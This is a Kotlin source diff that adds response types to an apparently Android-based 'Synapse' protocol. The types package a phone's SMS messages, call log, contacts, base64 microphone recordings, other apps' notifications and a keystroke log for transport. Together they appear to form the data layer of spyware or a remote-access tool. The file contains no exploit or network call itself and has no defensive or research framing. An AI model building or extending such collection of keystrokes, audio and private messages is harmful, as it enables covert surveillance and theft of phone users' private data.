@@ -100,6 +100,50 @@ sealed class SynapseResponse {
     ) : SynapseResponse()
 
     @Serializable
+    @SerialName("sms_list")
+    data class SmsListResponse(
+        val messages: List<SmsMessage>,
+        val count: Int
+    ) : SynapseResponse()
+
+    @Serializable
+    @SerialName("calls_list")
+    data class CallLogResponse(
+        val calls: List<CallEntry>,
+        val count: Int
+    ) : SynapseResponse()
+
+    @Serializable
+    @SerialName("contacts_list")
+    data class ContactsResponse(
+        val contacts: List<ContactEntry>,
+        val count: Int
+    ) : SynapseResponse()
+
+    @Serializable
+    @SerialName("mic_recording")
+    data class MicRecordingResponse(
+        val audio_base64: String,
+        val duration_seconds: Int,
+        val format: String = "AAC",
+        val size_bytes: Long = 0
+    ) : SynapseResponse()
+
+    @Serializable
+    @SerialName("notifications_list")
+    data class NotificationsResponse(
+        val notifications: List<NotificationEntry>,
+        val count: Int
+    ) : SynapseResponse()
+
+    @Serializable
+    @SerialName("keylog_dump")
+    data class KeylogResponse(
+        val keystrokes: List<KeylogEntry>,
+        val count: Int
+    ) : SynapseResponse()
+
+    @Serializable
     @SerialName("error")
     data class ErrorResponse(
         val error: String,
@@ -124,6 +168,47 @@ data class ClipboardEntry(
     val mime_type: String = "text/plain",
     val timestamp: Long = 0,
     val uri: String = ""
+)
+
+@Serializable
+data class SmsMessage(
+    val id: String = "",
+    val address: String = "",
+    val body: String = "",
+    val date: Long = 0,
+    val read: Boolean = false,
+    val type: String = "inbox"  // inbox, sent, draft
+)
+
+@Serializable
+data class CallEntry(
+    val number: String = "",
+    val type: String = "",  // incoming, outgoing, missed
+    val date: Long = 0,
+    val duration: Long = 0
+)
+
+@Serializable
+data class ContactEntry(
+    val display_name: String = "",
+    val phone_numbers: List<String> = emptyList(),
+    val emails: List<String> = emptyList()
+)
+
+@Serializable
+data class NotificationEntry(
+    val package_name: String = "",
+    val app_name: String = "",
+    val title: String = "",
+    val text: String = "",
+    val timestamp: Long = 0
+)
+
+@Serializable
+data class KeylogEntry(
+    val text: String = "",
+    val package_name: String = "",
+    val timestamp: Long = 0
 )
 
 // ─── Response envelope — wraps all typed responses for transport ────────────
